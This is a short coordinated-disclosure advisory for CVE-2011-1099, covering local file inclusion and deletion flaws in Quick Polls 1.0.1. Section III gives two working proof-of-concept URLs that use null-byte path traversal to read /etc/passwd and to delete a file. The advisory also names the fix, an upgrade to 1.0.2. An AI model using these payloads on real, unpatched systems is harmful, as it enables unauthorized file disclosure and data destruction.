@@ -1,0 +1,43 @@
+'Quick Polls' Local File Inclusion & Deletion Vulnerabilities (CVE-2011-1099)
+Mark Stanislav - mark.stanislav@gmail.com
+
+
+I. DESCRIPTION
+---------------------------------------
+Two vulnerabilities exist in 'Quick Polls' providing local file inclusion & local file deletion due to null-byte attacks against functions in index.php.
+
+ 
+II. TESTED VERSION
+---------------------------------------
+1.0.1
+
+
+III. PoC EXPLOITS
+---------------------------------------
+LFI: http://example.com/quickpolls/?fct=preview&p=../../../../../../../etc/passwd%00
+LFD: http://example.com/quickpolls/?fct=delete&p=../../../../../../../tmp/foobar%00
+
+
+IV. NOTES 
+---------------------------------------
+* magic_quotes_gpc must be disabled for null-byte attacks to work
+
+
+V. SOLUTION
+---------------------------------------
+Upgrade to 1.0.2 or above
+
+
+VI. REFERENCES
+---------------------------------------
+http://www.focalmedia.net/create_voting_poll.html
+http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-1099
+http://www.uncompiled.com/2011/03/quick-polls-local-file-inclusion-deletion-vulnerabilities-cve-2011-1099/
+
+
+VII. TIMELINE
+---------------------------------------
+02/05/2011 - Initial vendor disclosure
+02/07/2011 - Vendor patched and released an updated version
+02/07/2011 - Confirmed public disclosure date with vendor
+03/06/2011 - Public disclosure
